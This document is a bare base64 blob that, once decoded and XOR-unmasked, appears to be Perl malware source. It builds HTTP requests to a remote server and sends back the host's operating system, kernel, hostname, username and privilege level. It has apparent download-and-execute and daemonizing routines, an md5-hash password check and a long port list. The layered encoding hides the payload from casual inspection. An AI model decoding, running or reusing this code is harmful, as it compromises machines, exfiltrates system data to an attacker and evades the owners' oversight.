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BhsaHxwcBhsaHx0GGxofEgYbGh8TBhsaHAYbGhwaBhsaHBsGGxocGxwGGxocGx0GGxocGAYbGhwYGwYbGhwYHAYbGhwYEgYbGhwYEwYbGhwZBhsaHB4GGxocHwYbGhwcBhsaHB0GGxocEgYbGhwTBhsaHRoGGxodGwYbGh0YBhsaHRkGGxodHgYbGh0fBhsaHRwGGxodHQYbGh0dEgYbGh0SBhsaHRMGGxoSGgYbGhIbBhsaEhgGGxoSGQYbGhIeBhsaEh8GGxoSHAYbGhIdBhsaEhIGGxoSEwYbGhMGGxoTGgYbGhMbBhsaExgGGxoTGQYbGhMeBhsaEx8GGxoTHAYbGhMdBhsaExIGGxoTEwYbGxoGGxsaGgYbGxoYBhsbGh4GGxsaHwYbGxocBhsbGh0GGxsaEgYbGxsGGxsbGgYbGxsbBhsbGxsaBhsbGxsbBhsbGxgGGxsbGQYbGxseBhsbGx0GGxsbEwYbGxgbBhsbGBgGGxsYGQYbGxgeBhsbGBwGGxsZBhsbGRoGGxsZGwYbGxkYBhsbGR0GGxsZEgYbGx4bBhsbHh8GGxseHQYbGx4SBhsbHhMGGxsfGwYbGx8YBhsbHx4GGxscGQYbGxweBhsbHB8GGxscHAYbGxwTBhsbHR4GGxsdHwYbGxIZBhsbEh8GGxsSHAYbGxIdBhsbEwYbGxMYBhsbExwdBhsbExIGGxsTEwYbGBoaGgYbGBobBhsYGxkGGxgbHAYbGBsdBhsYGx0eBhsYGxIGGxgYGBgGGxgYHB8GGxgZGQYbGBkeBhsYGR4fBhsYGRwGGxgeHgYbGB4dBhsYHhIGGxgfBhsYHxMGGxgdGwYbGB0YBhsYHR0GGxgSHQYbGBMcBhsZBhsZGhoGGxkaGwYbGRoTBhsZGxoGGxkbGwYbGRgYBhsZGBIGGxkZGRkGGxkZHgYbGR4fHAYbGR8GGxkfGAYbGR0YGAYbGR0SGAYbGR0SGQYbGRMGGx4aGhoGGx4bHQYbHhgZEgYbHhkGGx4ZGQYbHhkeBhseHgYbHh4ZBhseHh4bBhseHh4YBhseHh4eBhseHx8GGx4cBhseHBsGGx4THgYbHxoaBhsfGhoaBhsfGhoYBhsfGhoZBhsfGhoeBhsfGhsGGx8aGQYbHxgbBhsfGB4GGx8ZGQYbHx8fHwYbHx8cBhsfHBwaBhsfHR4YBhsfEhoGGx8SGQYbHxMeBhscGhoGGxwaGhoGGxwaGhsGGxwaGxgGGxwaGxwGGxwaGxIGGxwaEhoGGxwbBhscGxsZBhscGQYbHB4bBhscHxIGGxwcHAYbHBwcHAYbHBIdBhscEhIGGxwTExgGGxwTExkGGx0GGx0aGgYbHRsdBhsdGxIGGx0bEwYbHRgaBhsdGBsGGx0YGQYbHR8fBhsdHBsGGx0dHR0GGx0SGAYbHRIZBhsdEh0dBhsdEwYbHRMSEgYbEhobBhsSGh4aBhsSGh8GGxIaEhoGGxIbGhsGGxIbGAYbEhkTBhsSHhoGGxIcGAYbEhwZBhsSHB4GGxIdHwYbEhISEgYbEhMSEgYbEwYbExoaBhsTGhMaBhsTGxobBhsTGx4GGxMYEhkGGxMZGx8GGxMZHwYbExkfGgYbEx4dBhsTHRsGGxMdGAYbEx0eBhsTHRIaBhsTEhobBhsTEh4GGxMSHhgGGxMTBhsTExIGGxMTEwYbExMTEwYYGgYYGhoaBhgaGhoaBhgaGhofBhgaGhsGGBoaGAYYGhoZBhgaGhkbBhgaGh4GGBoaHwYYGhocBhgaGh0GGBoaEgYYGhoTBhgaGxoGGBobGQYYGhgaBhgaGBsGGBoYGAYYGhgYGwYYGhgYGAYYGhkaBhgaGRkGGBoZHgYYGhkfBhgaGRIGGBoeGgYYGh4bBhgaHhgGGBoeGQYYGh4fBhgaHhwGGBoeHQYYGh4SBhgaHhMGGBocHwYYGhwSBhgaEhoGGBoSGBIGGBoSHAYYGhMTBhgbBhgbGhoGGBsaGQYYGxofBhgbGhwGGBsaHQYYGxsGGBsbGwYYGxsbGwYYGxsTBhgbGAYYGxgbBhgbGBwGGBsZHwYYGx4eBhgbHx0bBhgbHBoGGBscGwYYGx0aBhgbHRMGGBsTGgYYGxMbBhgbExwGGBgGGBgaGgYYGBsbBhgYGAYYGBgYBhgYGBgYBhgYGRkGGBgfGwYYGBwaBhgYEhIGGBgTGRMGGBkGGBkaGwYYGRgZBhgZGRkZBhgZHxoYBhgZHBwGGBkSGwYYGRIYBhgZEhkGGBkTGQYYGRMeBhgZExMGGB4GGB4aGwYYHh4ZBhgeHh4eBhgeEhoaBhgeExgGGB8GGB8aGgYYHxobGgYYHxgYBhgfGB8GGB8eBhgfHwYYHx8fHwYYHx8dBhgfHAYYHx0Z